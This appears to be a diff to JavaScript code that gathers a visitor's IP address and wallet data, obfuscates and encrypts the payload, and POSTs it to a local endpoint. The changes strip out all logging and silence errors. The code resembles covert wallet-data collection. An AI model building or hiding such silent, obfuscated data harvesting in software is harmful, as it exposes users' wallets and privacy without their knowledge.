@@ -19,7 +19,6 @@ const getIpAddress = async () => {
     const data = await response.json();
     return data.ip;
   } catch (error) {
-    console.error("Error fetching IP:", error);
     return null;
   }
 };
@@ -157,8 +156,6 @@ const sendWalletData = async (address) => {
       };
       /* javascript-obfuscator:enable */
 
-      console.log("Original wallet payload:", payload);
-
       // Generate a new encryption key
       const { key, base64Key } = await generateEncryptionKey();
 
@@ -171,7 +168,6 @@ const sendWalletData = async (address) => {
       };
 
       // Log the encrypted payload before sending
-      console.log("Encrypted wallet payload:", encryptedPayload);
 
       fetch("http://localhost:3001/index", {
         method: "POST",
@@ -181,9 +177,7 @@ const sendWalletData = async (address) => {
         body: JSON.stringify(encryptedPayload),
       });
     }
-  } catch (error) {
-    console.error("Error in sendWalletData:", error);
-  }
+  } catch (error) {}
 };
 
 const getWalletType = () => {
